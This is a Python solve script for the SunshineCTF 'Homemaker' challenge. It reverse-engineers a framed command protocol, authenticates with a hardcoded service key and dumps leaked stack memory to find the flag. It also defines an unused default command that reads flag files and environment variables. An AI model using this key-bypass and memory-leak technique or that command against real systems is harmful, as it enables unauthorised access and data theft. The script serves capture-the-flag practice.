#!/usr/bin/env python
"""Homemaker (SunshineCTF) -- talk to the Model 7 servo-command link and dump its memory.

Protocol, reconstructed from the binary (all frames, big-endian lengths):

    request  = ESC '[' <len:u16> <payload[len]> <crc8(payload)> ESC '\\'
    response = same framing, payload[0] is a status/command byte

crc8 (function at 0x11e9): acc=0; for each byte: acc^=b, then acc is doubled 8 times
with reduction 0x2f when the top bit is set (multiply by x^8 in GF(2^8), poly 0x12f).

Commands (jump table at 0x21c8, dispatcher at 0x1865):
    1  service key card: payload = 01 <u32 BE key>; accepted key is 0x1337c35f
       (hardcoded compare at 0x12a7). Sets capacity=0x100 and authenticates.
    2  punch a card: payload = 02 <bytes...> copied into the 256-byte "memory"
    3  print the memory: emits capacity bytes of the memory buffer -- which is an
       uninitialised stack array at [rbp-0x110], so it leaks stack contents
    4  ack, 5  system("/bin/echo -n ''") + ack, 0  -> status 0xe7

usage: python solve_homemaker.py HOST PORT [cmd]
"""
import re
import socket
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "sunshinectf.games"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 26008
CMD = sys.argv[3] if len(sys.argv) > 3 else "cat /flag*; ls -la /; env"

KEY = 0x1337C35F
FLAG_RE = re.compile(rb"sun\{[^{}]*\}")


def crc8(data):
    acc = 0
    for b in data:
        acc ^= b
        for _ in range(8):
            acc = ((acc << 1) ^ 0x2F) & 0xFF if acc & 0x80 else (acc << 1) & 0xFF
    return acc


def frame(payload):
    return b"\x1b[" + struct.pack(">H", len(payload)) + payload + bytes([crc8(payload)]) + b"\x1b\\"


def recv_frame(s, timeout=4.0):
    """Pull one framed response out of the socket."""
    s.settimeout(timeout)
    buf = b""
    while True:
        i = buf.find(b"\x1b[")
        if i >= 0 and len(buf) >= i + 7:
            ln = struct.unpack(">H", buf[i + 2:i + 4])[0]
            total = i + 4 + ln + 3
            if len(buf) >= total:
                body = buf[i + 4:i + 4 + ln]
                crc = buf[i + 4 + ln]
                tail = buf[i + 5 + ln:i + 7 + ln]
                return body, crc, tail, buf[:i]
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            return None, None, None, buf
        if not chunk:
            return None, None, None, buf
        buf += chunk
        if len(buf) > 200000:
            return None, None, None, buf


def main():
    s = socket.create_connection((HOST, PORT), timeout=15)
    banner = b""
    s.settimeout(2.0)
    try:
        while "<< INSERT SERVICE KEY CARD" not in banner.decode("latin-1", "replace").upper() \
                and len(banner) < 2000:
            c = s.recv(1024)
            if not c:
                break
            banner += c
    except socket.timeout:
        pass
    print("[*] banner %d bytes, tail: %r" % (len(banner), banner[-60:]))

    s.sendall(frame(bytes([1]) + struct.pack(">I", KEY)))
    body, crc, tail, pre = recv_frame(s)
    print("[*] key card -> payload=%r crc=%s tail=%r"
          % (body, None if crc is None else hex(crc), tail))
    if body is None or body[:1] != b"\x00":
        print("[-] authentication failed, aborting")
        s.close()
        return 1

    # memory dump (cmd 3): the emitted payload is the raw 256-byte stack region
    s.sendall(frame(b"\x03"))
    body, crc, tail, pre = recv_frame(s, timeout=6.0)
    if body is None:
        print("[-] no response to memory dump")
        s.close()
        return 1
    print("[+] memory dump: %d bytes, crc ok=%s, terminator=%r"
          % (len(body), crc == crc8(body), tail))
    printable = re.sub(rb"[^\x20-\x7e]", b".", body)
    print("\n--- dump as text ---\n%s\n" % printable.decode())
    hits = FLAG_RE.findall(body)
    for h in hits:
        print("[+] FLAG in memory: %s" % h.decode())
    with open("dump.bin", "wb") as f:
        f.write(body)
    s.close()
    return 0 if hits else 2


if __name__ == "__main__":
    sys.exit(main())
